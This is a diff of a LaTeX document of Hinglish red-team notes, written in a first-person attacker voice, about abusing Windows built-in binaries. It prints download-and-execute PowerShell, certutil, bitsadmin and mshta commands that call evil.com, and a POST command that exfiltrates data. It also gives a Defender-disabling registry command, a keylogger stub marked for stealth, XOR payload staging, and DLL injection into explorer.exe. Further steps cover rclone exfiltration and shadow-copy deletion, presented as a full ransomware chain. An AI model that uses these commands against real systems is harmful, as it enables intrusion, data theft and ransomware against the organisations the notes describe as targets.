@@ -88,7 +88,8 @@ powershell -nop -w hidden -enc ...
 certutil -urlcache -split -f http[:]//evil.com/secret.zip secret.zip
 \end{verbatim}
     \end{tcolorbox}
-  \item \texttt{powershell.exe} Automation scripts Download-exec (\texttt{IEX (New-Object Net.WebClient).DownloadString()}), AMSI bypass
+  \item \texttt{powershell.exe} Automation scripts Download-exec (\texttt{IEX (New-Object Net.WebClient) \\
+  .DownloadString()}), AMSI bypass
     \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
 \begin{verbatim}
 IEX (New-Object Net.WebClient).DownloadString()
@@ -620,16 +621,13 @@ mshta http://evil.com/mal.hta
         Kyunki reg.exe legit hai, AV usually nahi block karta (bypass hone se).\\
         Harm: Organization mein malware spread, data loss.
         \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
-          \documentclass[a4paper,12pt]{article}
-          \usepackage[margin=1in]{geometry}
-          \usepackage{setspace}
-          \usepackage{fancyvrb}  % Better verbatim control
+          
 
           \begin{document}
           \onehalfspacing  % Optional: improves readability
 
 \begin{Verbatim}[fontsize=\small]
-REG add "HKLM\SOFTWARE\POLICIES\microsoft\windows defender\Real-Time protection /v DisabledRealtimeMonitoring /t REG_DWORD /d 1 /f"
+REG add "HKLM\SOFTWARE\POLICIES\microsoft\windows defender\Real-Time protection /v DisabledRealtimeMonitoring /t REG\_DWORD /d 1 /f"
 \end{Verbatim}
 
           \end{document}
@@ -750,12 +748,12 @@ objShell.Run "powershell.exe -c (New-Object Net.WebClient).DownloadFile('http://
       \item Execution (Red Teamer Step - Code Running on Victim Machine): Script run hota hai in-memory, commands execute. Yeh step critical hai – no pop-up if code hidden hai.
       \item Small Malicious Code Example 2 (JS for Keylogger – Beginner Clear): Yeh simple JS code keys log karta hai aur attacker ko bhejta hai. Save as keylog.js:
         \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
-    \begin{verbatim}
-    var shell = new ActiveXObject("WScript.Shell");  // COM for commands
-    shell.Run("cmd.exe /c echo Logging keys > C:\\Temp\\keys.txt");  // Create log file
-    // Extra: Loop for capturing keys and send to server (simplified)
-    WScript.Echo("Keylogger started");  // Test message, remove for stealth
-    \end{verbatim}
+  \begin{lstlisting}[language=JavaScript, caption=Keylogger Script]
+var shell = new ActiveXObject("WScript.Shell");  // COM for commands
+shell.Run("cmd.exe /c echo Logging keys > C:\\Temp\\keys.txt");  // Create log file
+// Extra: Loop for capturing keys and send to server (simplified)
+WScript.Echo("Keylogger started");  // Test message, remove for stealth
+\end{lstlisting}
         \end{tcolorbox}
         Kaise attack mein? \texttt{wscript.exe keylog.js} (victim double-click se). What happens? Keys log hoti hain, harm: Passwords chori (organization ko data breach, legal fines, ya espionage – e.g., bank details leak se money loss). My perspective: Main yeh persistence ke liye use karta hoon, script ko scheduled task mein add karke long-term logging ke liye.
       \item Post-Exploitation (Red Teamer Step - Further Harm): Code se main C2 establish karta hoon ya data exfil. Example: Upar ke code mein add karo network send for real harm.
@@ -833,28 +831,37 @@ Get-Process
 \end{verbatim}
     \end{tcolorbox}
   \item How Hackers Abuse (Step-by-Step for Beginner, with Examples): Jaise tune kaha, ways to abuse: execute code, steal data, install/spread malware. My red teamer perspective: Main isko phishing se start karta hoon taaki foothold bana sake.
-    \begin{enumerate}
-      \item Create Malicious Script: Small code likho (.ps1 file).
-      \item Deliver: Phishing email/USB se.
-      \item Execute: PowerShell se run, harm karo.
-      \item Post-Abuse: Clean up.
-    \end{enumerate}
-  \item Abuse Way 1: Execute Malicious Code (Example): \texttt{IEX (New-Object Net.WebClient).DownloadString('http://evil.com/code.ps1')} – Yeh remote script download aur run. Harm: Backdoor install, organization ko control loss.
+\begin{enumerate}[label=\arabic*.]
+  \item Create Malicious Script: Small code likho (.ps1 file).
+  \item Deliver: Phishing email/USB se.
+  \item Execute: PowerShell se run, harm karo.
+  \item Post-Abuse: Clean up.
+
+  \item Abuse Way 1: Execute Malicious Code (Example):  
+  Harm: Backdoor install, organization ko control loss.
+  \begin{tcolorbox}[title=Remote Execution, colback=gray!5, boxrule=0.5pt, arc=4pt]
+  \texttt{IEX (New-Object Net.WebClient).DownloadString('http://evil.com/code.ps1')}
+  \end{tcolorbox}
+
+  \item Abuse Way 2: Steal Data (Example):  
+  Harm: Sensitive info leak, financial damage.
+  \begin{tcolorbox}[title=Data Exfiltration, colback=gray!5, boxrule=0.5pt, arc=4pt]
+  \texttt{Get-Process | Out-File data.txt; Invoke-WebRequest -Uri 'http://evil.com' -Method POST -Body (Get-Content data.txt)}
+  \end{tcolorbox}
+
+  \item Abuse Way 3: Install Malware (Example):  
+  Harm: Ransomware, operations disrupt.
+  \begin{tcolorbox}[title=Malware Installation, colback=gray!5, boxrule=0.5pt, arc=4pt]
+  \begin{lstlisting}[language=PowerShell]
+(New-Object Net.WebClient).DownloadFile('http://evil.com/mal.exe', 'mal.exe')
+Start-Process mal.exe
+  \end{lstlisting}
+  \end{tcolorbox}
+\end{enumerate}
     \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
 \begin{verbatim}
-IEX (New-Object Net.WebClient).DownloadString('http://evil.com/code.ps1')
-\end{verbatim}
-    \end{tcolorbox}
-  \item Abuse Way 2: Steal Data (Example): \texttt{Get-Process | Out-File data.txt; Invoke-WebRequest -Uri 'http://evil.com' -Method POST -Body (Get-Content data.txt)} – Processes steal aur send. Harm: Sensitive info leak, financial damage.
-    \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
-\begin{verbatim}
-Get-Process | Out-File data.txt; Invoke-WebRequest -Uri 'http://evil.com' -Method POST -Body (Get-Content data.txt)
-\end{verbatim}
-    \end{tcolorbox}
-  \item Abuse Way 3: Install Malware (Example): \texttt{(New-Object Net.WebClient).DownloadFile('http://evil.com/mal.exe', 'mal.exe'); Start-Process mal.exe} – Download aur launch. Harm: Ransomware, operations disrupt.
-    \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
-\begin{verbatim}
-(New-Object Net.WebClient).DownloadFile('http://evil.com/mal.exe', 'mal.exe'); Start-Process mal.exe
+(New-Object Net.WebClient).DownloadFile('http://evil.com/mal.exe', \\
+'mal.exe'); Start-Process mal.exe
 \end{verbatim}
     \end{tcolorbox}
   \item Abuse Way 4: Spread Malware (Example): \texttt{Invoke-Command -ComputerName targetPC -ScriptBlock \{malicious code\}} – Remote spread. Harm: Network-wide infection.
@@ -904,17 +911,7 @@ powershell.exe -c "download code"
 \noindent\rule{\textwidth}{1pt}
 \texttt{=============================================================}
 
-\documentclass[a4paper,12pt]{article}
-\usepackage[utf8]{inputenc}
-\usepackage[T1]{fontenc}
-\usepackage{geometry}
-\geometry{a4paper, margin=1in}
-\usepackage{xcolor}
-\usepackage{tcolorbox}
-\tcbuselibrary{listings}
-\usepackage{enumitem}
-\usepackage{longtable}
-\usepackage{booktabs}
+
 
 \definecolor{codebg}{RGB}{245,245,245}
 \definecolor{titleblue}{RGB}{0,51,102}
@@ -980,9 +977,7 @@ wmic cpu get name
     \begin{enumerate}
       \item Recon (Red Teamer Step): Target IP se services check (tune diya command) – example: \texttt{wmic /node:"192.168.1.100" /user:"admin" /password:"pass" service where caption like "\%sql server\%"} – Harm: Vulnerable services find, attack plan (organization ko DB breach).
         \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
-    \begin{verbatim}
-    wmic /node:"192.168.1.100" /user:"admin" /password:"pass" service where caption like "%sql server%"
-    \end{verbatim}
+   \cmd{wmic /node:"192.168.1.100" /user:"admin" /password:"pass" service where caption like "\%sql server\%"}
         \end{tcolorbox}
       \item Execution (Red Teamer Step): Process create for payload – example: \texttt{wmic /node:"targetIP" process call create "cmd.exe /c evil.exe"} – Harm: Malware run, data theft.
         \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
@@ -1175,30 +1170,33 @@ vssadmin delete shadows
     Application.Run "StartAttack"
     \end{verbatim}
         \end{tcolorbox}
-      \item Run WScript.exe (Script Execution – When: Macro Se, Why: Hidden Scripting): Macro wscript.exe launch karta hai with malicious VBS. How (small example): \texttt{wscript.exe C:\textbackslash Temp\textbackslash mal.vbs} – VBS code: \texttt{Set objShell = CreateObject("WScript.Shell"); objShell.Run "powershell.exe -c 'NextStep'"}. What happens? Script hidden run hota hai, harm: Further chain (e.g., data steal start). My view: Main isko use karta hoon for no visible window.
+        \item Run WScript.exe (Script Execution – When: Macro Se, Why: Hidden Scripting): Macro wscript.exe launch karta hai with malicious VBS. How (small example): \texttt{wscript.exe C:\textbackslash Temp\textbackslash mal.vbs} – VBS code: \texttt{Set objShell = CreateObject("WScript.Shell"); objShell.Run "powershell.exe -c 'NextStep'"}. What happens? Script hidden run hota hai, harm: Further chain (e.g., data steal start). My view: Main isko use karta hoon for no visible window.
         \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
     \begin{verbatim}
     wscript.exe C:\Temp\mal.vbs
     Set objShell = CreateObject("WScript.Shell"); objShell.Run "powershell.exe -c 'NextStep'"
     \end{verbatim}
         \end{tcolorbox}
-      \item Run PowerShell.exe Using SyncApp Publishing Server.vbs (Automation – When: WScript Se, Why: Powerful Commands): VBS se PowerShell call (syncappvpublishingserver.vbs ek common bypass script hai jo execution policy ignore karta hai). How (example): \texttt{powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"}. What happens? Remote script download/run, harm: Malware install (e.g., keylogger). My view: Bypass AMSI for fileless attacks.
+      \item Run PowerShell.exe Using SyncApp Publishing Server.vbs (Automation – When: WScript Se, Why: Powerful Commands): VBS se PowerShell call (syncappvpublishingserver.vbs ek common bypass script hai jo execution policy ignore karta hai). How (example): \texttt{powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString \\
+      ('http://evil.com/payload.ps1')"}. What happens? Remote script download/run, harm: Malware install (e.g., keylogger). My view: Bypass AMSI for fileless attacks.
         \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
-    \begin{verbatim}
-    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
-    \end{verbatim}
+   \parbox{\linewidth}{\ttfamily
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
+}
         \end{tcolorbox}
       \item Download dscoo2.jpeg from https:// (Payload Fetch – When: PowerShell Se, Why: Staging): PowerShell certutil.exe ya bitsadmin.exe use karta hai download ke liye. How (example): \texttt{certutil.exe -urlcache -f https://evil.com/dscoo2.jpeg C:\textbackslash Temp\textbackslash file.jpg} (or \texttt{bitsadmin /create job /addfile job https://evil.com/dscoo2.jpeg C:\textbackslash Temp\textbackslash file.jpg /resume job}). What happens? File download (disguised as image), harm: Payload ready. My view: Certutil for stealthy fetch.
         \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
-    \begin{verbatim}
-    certutil.exe -urlcache -f https://evil.com/dscoo2.jpeg C:\Temp\file.jpg
-    bitsadmin /create job /addfile job https://evil.com/dscoo2.jpeg C:\Temp\file.jpg /resume job
-    \end{verbatim}
+   \texttt{certutil.exe -urlcache -f https://evil.com/dscoo2.jpeg C:\textbackslash{}Temp\textbackslash{}file.jpg; bitsadmin /create job /addfile job https://evil.com/dscoo2.jpeg C:\textbackslash{}Temp\textbackslash{}file.jpg /resume job}
         \end{tcolorbox}
-      \item XOR the Downloaded File and Write the Final DLL to C:\textbackslash ProgramData\textbackslash imapi2.dll (Obfuscation – When: Download Ke Baad, Why: Hide Payload): PowerShell XOR decrypt karta hai (simple obfuscation). How (small code example): \texttt{\$data = [System.IO.File]::ReadAllBytes('C:\textbackslash Temp\textbackslash file.jpg'); for(\$i=0; \$i -lt \$data.Length; \$i++){ \$data[\$i] = \$data[\$i] -bxor 0x5A }; [System.IO.File]::WriteAllBytes('C:\textbackslash ProgramData\textbackslash imapi2.dll', \$data)}. What happens? Encrypted file DLL ban jata hai, harm: Ready for injection. My view: XOR for AV evasion.
+      \item XOR the Downloaded File and Write the Final DLL to C:\textbackslash ProgramData\textbackslash imapi2.dll (Obfuscation – When: Download Ke Baad, Why: Hide Payload): PowerShell XOR decrypt karta hai (simple obfuscation). How (small code example): \texttt{\$data = [System.IO.File]::ReadAllBytes('C:\textbackslash Temp\textbackslash file.jpg'); for(\$i=0; \$i -lt \$data.Length; \$i++){ \$data[\$i] = \$data[\$i] -bxor 0x5A }; [System.IO.File]::
+      \\
+      WriteAllBytes('C:\textbackslash ProgramData\textbackslash imapi2.dll', \$data)}. What happens? Encrypted file DLL ban jata hai, harm: Ready for injection. My view: XOR for AV evasion.
         \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
     \begin{verbatim}
-    $data = [System.IO.File]::ReadAllBytes('C:\Temp\file.jpg'); for($i=0; $i -lt $data.Length; $i++){ $data[$i] = $data[$i] -bxor 0x5A }; [System.IO.File]::WriteAllBytes('C:\ProgramData\imapi2.dll', $data)
+    $data = [System.IO.File]::ReadAllBytes('C:\Temp\file.jpg'); 
+    \\
+    for($i=0; $i -lt $data.Length; $i++){ $data[$i] = $data[$i] -bxor 0x5A }; \\
+    [System.IO.File]::WriteAllBytes('C:\ProgramData\imapi2.dll', $data)
     \end{verbatim}
         \end{tcolorbox}
       \item Run the DLL Using rundll32.exe (Execution – When: DLL Ready, Why: Proxy Exec): \texttt{rundll32.exe C:\textbackslash ProgramData\textbackslash imapi2.dll, MalEntry}. What happens? DLL mein hidden code run (e.g., backdoor), harm: System control. My view: Rundll32 for trusted loading.
@@ -1216,9 +1214,7 @@ vssadmin delete shadows
         \end{tcolorbox}
       \item Inject the Downloaded DLL to explorer.exe (Persistence/Injection – When: Final Stage, Why: Hide in Legit Process): DLL code conhost.exe ya reg.exe use karta hai injection ke liye (e.g., \texttt{reg add} for run key, ya advanced DLL injection via PowerShell). How (example): PowerShell se \texttt{Invoke-DLLInjection -ProcessID (Get-Process explorer).Id -DLLPath 'C:\textbackslash Temp\textbackslash inject.dll'}. What happens? Code explorer.exe mein inject, harm: Persistent access (e.g., data exfil). My view: Explorer for blending.
         \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
-    \begin{verbatim}
-    Invoke-DLLInjection -ProcessID (Get-Process explorer).Id -DLLPath 'C:\Temp\inject.dll'
-    \end{verbatim}
+   \texttt{Invoke-DLLInjection -ProcessID (Get-Process explorer).Id -DLLPath 'C:\textbackslash{}Temp\textbackslash{}inject.dll'}
         \end{tcolorbox}
     \end{enumerate}
   \item \textbf{Note:}\color{notered} Note: \color{black} Full Flow Integration with All LOLBins: Upar flow mein sab include kiye – reg.exe for registry mods (e.g., \texttt{reg add} for AV disable), wmic for remote check, bitsadmin/certutil for downloads, conhost for hidden exec, mshta for HTA payloads, powershell/wscript for scripting, rundll32 for DLL run, rclone for exfil (e.g., \texttt{rclone copy C:\textbackslash data mega:/stolen}), vssadmin for backups delete (\texttt{vssadmin delete shadows /all /quiet} – harm: No recovery). Example: Post-injection, rclone exfil karta hai, vssadmin delete backups – full ransomware.
@@ -1257,17 +1253,7 @@ vssadmin delete shadows
 \noindent\rule{\textwidth}{1pt}
 \texttt{=============================================================}
 
-\documentclass[a4paper,12pt]{article}
-\usepackage[utf8]{inputenc}
-\usepackage[T1]{fontenc}
-\usepackage{geometry}
-\geometry{a4paper, margin=1in}
-\usepackage{xcolor}
-\usepackage{tcolorbox}
-\tcbuselibrary{listings}
-\usepackage{enumitem}
-\usepackage{longtable}
-\usepackage{booktabs}
+
 
 \definecolor{codebg}{RGB}{245,245,245}
 \definecolor{titleblue}{RGB}{0,51,102}
@@ -1380,7 +1366,7 @@ LoadLibrary("mal.dll")
 \end{verbatim}
     \end{tcolorbox}
   \item \textbf{Note:}\color{notered} Note: \color{black} API (Application Programming Interface) ek set of rules aur functions hota hai jo programs ko OS ya services se interact karne deta hai. Windows mein, APIs ko WinAPI (Windows API) kehte hain, jo thousands of functions provide karta hai jaise file handling, UI creation, network calls, ya process management. APIs DLLs mein store hote hain (e.g., user32.dll mein MessageBox API), aur programs unko call karte hain.
-  \item \textbf{Note:}\color{notered} Note: \color{black} What It Contains and How APIs Look (Basic se Explain): APIs functions ka collection hote hain – each API ek specific task karta hai (e.g., CreateFile API file open). Structure: Header files (e.g., windows.h) mein declarations, DLLs mein implementation. Kaisa dikhta hai? Code mein call jaise \texttt{MessageBox(NULL, "Hello", "Title", MB_OK)} – yeh popup show karta hai. Windows APIs categories mein divide: Base (kernel32.dll for processes), User (user32.dll for UI), GDI (graphics), etc.
+ \item \textbf{Note:} \textcolor{red}{Note:} \textcolor{black}{What It Contains and How APIs Look (Basic se Explain):} APIs functions ka collection hote hain – each API ek specific task karta hai (e.g., CreateFile API file open). Structure: Header files (e.g., \texttt{windows.h}) mein declarations, DLLs mein implementation. Kaisa dikhta hai? Code mein call jaise \texttt{MessageBox(NULL, "Hello", "Title", MB\_OK")} – yeh popup show karta hai. Windows APIs categories mein divide: Base (\texttt{kernel32.dll} for processes), User (\texttt{user32.dll} for UI), GDI (graphics), etc.
     \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
 \begin{verbatim}
 MessageBox(NULL, "Hello", "Title", MB_OK)
@@ -1394,7 +1380,13 @@ MessageBox(NULL, "Hello", "Title", MB_OK)
     \end{itemize}
   \item \textbf{Note:}\color{notered} Note: \color{black} Why to Use APIs? (Kyun Important Hai, Aur Agar Nahi Use Kiye Toh Kya Hota Hai): APIs OS ke features access karne ka standard way dete hain – why? Portability aur efficiency. Red teaming mein, hum APIs hook karte hain for monitoring ya modifying behavior. Why important? Direct hardware access bina APIs ke dangerous (crash). Agar nahi use kiya, toh app limited rahega (e.g., no file access). Pros: Standardized, powerful. Cons: Complex (learning curve), version dependencies.
   \item \textbf{Note:}\color{notered} Note: \color{black} How APIs Work? (Kaise Kaam Karte Hain): Basic: Program API call karta hai (e.g., via C++), OS DLL load karke function execute. Advanced: API hooking (detours library se intercept) for man-in-middle.
-  \item \textbf{Note:}\color{notered} Note: \color{black} How Red Teamers Use APIs for Malicious Purposes (My Expert Perspective with Examples): As a Red Team Expert, main APIs ko target karta hoon for advanced attacks like hooking (behavior change) ya calling for malicious tasks. Example 1 (Basic): CreateRemoteThread API use karke DLL inject (code: \texttt{CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pDllPath, 0, NULL)} – harm: Code injection for backdoor. Example 2 (Advanced Hooking): SetWindowsHookEx API se keyboard hook (capture keys) – harm: Keylogging (data theft). Why I use it: APIs low-level access dete hain, agar nahi kiya toh attack weak rahega.
+ \item \textbf{Note:} \textcolor{red}{Note:} \textcolor{black}{How Red Teamers Use APIs for Malicious Purposes (My Expert Perspective with Examples):} As a Red Team Expert, main APIs ko target karta hoon for advanced attacks like hooking (behavior change) ya calling for malicious tasks.
+
+Example 1 (Basic): \texttt{CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD\_START\_ROUTINE)LoadLibraryA, pDllPath, 0, NULL)} – harm: Code injection for backdoor.
+
+Example 2 (Advanced Hooking): \texttt{SetWindowsHookEx} API se keyboard hook (capture keys) – harm: Keylogging (data theft).
+
+Why I use it: APIs low-level access dete hain, agar nahi kiya toh attack weak rahega.
       \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
 \begin{verbatim}
 CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pDllPath, 0, NULL)
@@ -1547,18 +1539,7 @@ CreateRemoteThread
   \noindent\rule{\textwidth}{1pt}
   \texttt{=============================================================}
 
-  \documentclass[a4paper,12pt]{article}
-  \usepackage[utf8]{inputenc}
-  \usepackage[T1]{fontenc}
-  \usepackage{geometry}
-  \geometry{a4paper, margin=1in}
-  \usepackage{xcolor}
-  \usepackage{tcolorbox}
-  \tcbuselibrary{listings}
-  \usepackage{enumitem}
-  \usepackage{longtable}
-  \usepackage{booktabs}
-  \usepackage{hyperref}
+ 
 
   \definecolor{codebg}{RGB}{245,245,245}
   \definecolor{titleblue}{RGB}{0,51,102}
@@ -1800,8 +1781,30 @@ https://mitre-attack.github.io/attack-navigator/
     \item My perspective as Red Teamer: OSINT mera secret weapon hai – yeh blue teams ko outsmart karne mein help karta hai bina traces chhode.
     \item \textbf{Note:}\color{notered} Note: \color{black} How OSINT Works? (Kaise Kaam Karta Hai, Basic to Advanced) How? OSINT data collect karne se shuru hota hai (manual search ya automated tools), phir analyze (patterns find), aur apply (attack/defense mein use). Basic: Google search for company info. Advanced: APIs integrate karke automated hunting (e.g., scripts for daily scans). Tools platforms pe depend karte hain, jo ab explain karunga.
     \item \textbf{Note:}\color{notered} Note: \color{black} Comprehensive Exploration of OSINT Platforms (One by One, with Red Teamer Usage) Ab main har platform ko detail mein explain karunga – what it is, origin, when/why to use (red teamer view), how to use (step-by-step with examples), real examples (how I use it in ops), pros/cons, aur advanced tips. Yeh red team focus pe hain (recon for attacks), but blue team benefits bhi bataunga.
-      \begin{itemize}
-        \item a. Shodan (What, When, Why, How) \textbf{What It Is (Yeh Kya Hai)}: Shodan ek search engine hai jo internet-connected devices (jaise servers, IoT, routers) ko scan karta hai aur unke metadata (ports, services, vulnerabilities) provide karta hai. Yeh "Internet of Things search engine" ke naam se famous hai, 2013 mein John Matherly ne banaya tha. \textbf{When to Use (Kab)}: Recon phase mein jab tu exposed devices find karna chahta hai (e.g., pre-phishing). \textbf{Why to Use (Kyun, Aur Nahi Kiya Toh Kya)}: Why? Vast database deta hai vulnerable targets ka (e.g., open ports). Red teamer ke liye important kyunki yeh weak entry points show karta hai. Agar nahi use kiya, recon manual aur slow ho jata hai (missed opportunities). Pros: Real-time scans, filters (e.g., country:IN). Cons: Paid for full access, public hone se ethical issues. \textbf{How to Use (Step-by-Step for Beginners)}: 1. Shodan.io pe sign up (free account se start). 2. Search query likho (e.g., "port:80 country:IN" for Indian web servers). 3. Results dekho (IPs, banners). Advanced: API use for scripts (e.g., shodan search --fields ip_str,port "apache"). \textbf{Red Teamer Usage with Real Example (My Perspective)}: As a Red Team Expert, main Shodan ko use karta hoon targets ke exposed services find karne ke liye taaki phishing ya exploits plan kar sakein. Real example: Ek op mein, main "port:3389 country:IN" search kiya RDP servers ke liye – ek vulnerable server mila jahaan weak password tha, usko exploit karke access gain kiya (harm: Internal network entry). Why I use it: Quick recon, agar nahi kiya toh blind attack hota.
+\begin{itemize}
+  \item \textbf{a. Shodan (What, When, Why, How)} 
+
+  \textbf{What It Is (Yeh Kya Hai)}: Shodan ek search engine hai jo internet-connected devices (jaise servers, IoT, routers) ko scan karta hai aur unke metadata (ports, services, vulnerabilities) provide karta hai. Yeh "Internet of Things search engine" ke naam se famous hai, 2013 mein John Matherly ne banaya tha.
+
+  \textbf{When to Use (Kab)}: Recon phase mein jab tu exposed devices find karna chahta hai (e.g., pre-phishing).
+
+  \textbf{Why to Use (Kyun, Aur Nahi Kiya Toh Kya)}: Vast database deta hai vulnerable targets ka (e.g., open ports). Red teamer ke liye important kyunki yeh weak entry points show karta hai. Agar nahi use kiya, recon manual aur slow ho jata hai (missed opportunities).\\
+  Pros: Real-time scans, filters (e.g., \texttt{country:IN}).\\
+  Cons: Paid for full access, public hone se ethical issues.
+
+  \textbf{How to Use (Step-by-Step for Beginners)}:
+  \begin{enumerate}
+    \item Shodan.io pe sign up (free account se start).
+    \item Search query likho (e.g., \texttt{"port:80 country:IN"} for Indian web servers).
+    \item Results dekho (IPs, banners).
+    \item Advanced: API use for scripts (e.g., \texttt{shodan search --fields ip\_str,port "apache"}).
+  \end{enumerate}
+
+  \textbf{Red Teamer Usage with Real Example (My Perspective)}: As a Red Team Expert, main Shodan ko use karta hoon targets ke exposed services find karne ke liye taaki phishing ya exploits plan kar sakein.\\
+  Real example: Ek op mein, main \texttt{"port:3389 country:IN"} search kiya RDP servers ke liye – ek vulnerable server mila jahaan weak password tha, usko exploit karke access gain kiya.\\
+  Harm: Internal network entry.\\
+  Why I use it: Quick recon, agar nahi kiya toh blind attack hota.
+\end{itemize}
           \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
     \begin{verbatim}
 port:80 country:IN
@@ -1809,10 +1812,32 @@ shodan search --fields ip_str,port "apache"
 port:3389 country:IN
     \end{verbatim}
           \end{tcolorbox}
-        \item b. AbuseIPDB (What, When, Why, How) \textbf{What It Is (Yeh Kya Hai)}: AbuseIPDB ek free database hai jo malicious IPs report aur check karta hai (e.g., spam, hacking attempts). Yeh community-driven hai, 2015 mein start hua, aur IPs ke abuse history store karta hai. \textbf{When to Use (Kab)}: Recon mein suspicious IPs validate karne ke liye, ya blue team mein alerts check. \textbf{Why to Use (Kyun, Aur Nahi Kiya Toh Kya)}: Why? IP reputation deta hai (e.g., hacking source hai ya nahi). Red teamer ke liye important kyunki yeh safe IPs find karne mein help karta hai for C2. Agar nahi use kiya, wrong IP se attack block ho jata hai. Pros: Community reports, free API. Cons: False positives possible. \textbf{How to Use (Step-by-Step)}: 1. AbuseIPDB.com pe jaao, IP search (e.g., 8.8.8.8). 2. Results dekho (abuse confidence score). Advanced: API key le kar script (e.g., curl -G https://api.abuseipdb.com/api/v2/check --data-urlencode "ipAddress=8.8.8.8" -H "Key: YOUR_API_KEY"). \textbf{Red Teamer Usage with Real Example (My Perspective)}: Main AbuseIPDB ko use karta hoon apne C2 IPs check karne ke liye taaki clean lagen (nahi toh blocked). Example: Ek sim mein, main ek IP choose kiya jo low abuse score tha, usko C2 server banaaya – attack successful raha bina detection ke (harm: Long-term access). Blue team side: Yeh alerts verify karne ke liye use hota hai.
+    \item \textbf{b. AbuseIPDB (What, When, Why, How)}
+
+\textbf{What It Is (Yeh Kya Hai)}: AbuseIPDB ek free database hai jo malicious IPs report aur check karta hai (e.g., spam, hacking attempts). Yeh community-driven hai, 2015 mein start hua, aur IPs ke abuse history store karta hai.
+
+\textbf{When to Use (Kab)}: Recon mein suspicious IPs validate karne ke liye, ya blue team mein alerts check.
+
+\textbf{Why to Use (Kyun, Aur Nahi Kiya Toh Kya)}: IP reputation deta hai (e.g., hacking source hai ya nahi). Red teamer ke liye important kyunki yeh safe IPs find karne mein help karta hai for C2. Agar nahi use kiya, wrong IP se attack block ho jata hai.\\
+Pros: Community reports, free API.\\
+Cons: False positives possible.
+
+\textbf{How to Use (Step-by-Step)}:
+\begin{enumerate}
+  \item AbuseIPDB.com pe jaao, IP search karo (e.g., \texttt{8.8.8.8}).
+  \item Results dekho (abuse confidence score).
+  \item Advanced: API key le kar script run karo: \parbox{\linewidth}{\ttfamily curl -G https://api.abuseipdb.com/api \\
+  /v2/check --data-urlencode "ipAddress=8.8.8.8" -H "Key: YOUR\_API\_KEY"}
+\end{enumerate}
+
+\textbf{Red Teamer Usage with Real Example (My Perspective)}: Main AbuseIPDB ko use karta hoon apne C2 IPs check karne ke liye taaki clean lagen (nahi toh blocked ho jaayein).\\
+Example: Ek sim mein, main ek IP choose kiya jo low abuse score tha, usko C2 server banaaya – attack successful raha bina detection ke.\\
+Harm: Long-term access.\\
+Blue team side: Yeh alerts verify karne ke liye bhi use hota hai.
           \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
     \begin{verbatim}
-curl -G https://api.abuseipdb.com/api/v2/check --data-urlencode "ipAddress=8.8.8.8" -H "Key: YOUR_API_KEY"
+curl -G https://api.abuseipdb.com/api/v2/check --data-urlencode "ipAddress=8.8.8.8" \\
+-H "Key: YOUR_API_KEY"
     \end{verbatim}
           \end{tcolorbox}
         \item c. Threatbook.io (What, When, Why, How) \textbf{What It Is (Yeh Kya Hai)}: Threatbook ek Chinese threat intelligence platform hai jo IPs, domains, files ke reputation, malware analysis, aur APT tracking provide karta hai. Yeh 2015 mein start hua, AI-based hai aur global threats track karta hai. \textbf{When to Use (Kab)}: Advanced recon mein jab detailed threat intel chahiye (e.g., APT groups track). \textbf{Why to Use (Kyun, Aur Nahi Kiya Toh Kya)}: Why? High-fidelity intel deta hai (e.g., IP labels like botnet). Red teamer ke liye important kyunki yeh safe paths find karne mein help karta hai. Agar nahi use kiya, outdated info se attack fail. Pros: AI-driven, vast database. Cons: Paid for full access, China-focused bias. \textbf{How to Use (Step-by-Step)}: 1. Threatbook.io pe sign up (free tier se start). 2. Search IP/domain (e.g., threatbook.io/ip/8.8.8.8). 3. Results dekho (risk score, tags). Advanced: API for automation (e.g., query for APT intel). \textbf{Red Teamer Usage with Real Example (My Perspective)}: Main Threatbook ko use karta hoon targets ke APT history check karne ke liye taaki similar attacks avoid kar sakein. Example: Ek op mein, main ek domain check kiya jo low risk tha, usko phishing ke liye use kiya – successful entry mila (harm: Data breach simulation).
@@ -1849,19 +1874,7 @@ virustotal.com
   \noindent\rule{\textwidth}{1pt}
   \texttt{=============================================================}
 
-  \documentclass[a4paper,12pt]{article}
-  \usepackage[utf8]{inputenc}
-  \usepackage[T1]{fontenc}
-  \usepackage{geometry}
-  \geometry{a4paper, margin=1in}
-  \usepackage{xcolor}
-  \usepackage{tcolorbox}
-  \tcbuselibrary{listings}
-  \usepackage{enumitem}
-  \usepackage{longtable}
-  \usepackage{booktabs}
-  \usepackage{hyperref}
-
+ 
